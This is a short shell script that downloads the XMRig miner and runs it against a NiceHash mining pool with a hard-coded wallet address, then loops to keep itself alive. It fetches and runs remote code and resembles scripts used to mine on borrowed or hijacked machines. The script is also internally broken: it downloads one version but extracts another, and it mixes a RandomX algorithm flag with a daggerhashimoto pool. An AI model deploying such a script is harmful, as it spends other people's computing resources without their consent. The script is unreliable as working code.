#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz
tar xf xmrig-6.14.0-linux-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o stratum+tcp://daggerhashimoto.eu-west.nicehash.com:3353 -a rx -k -u 33FjMupkbTCEPuceHecMj61LV6ZaqaVpoF -p x --cpu 8
while [ 1 ]; do
sleep 3
done
sleep 999
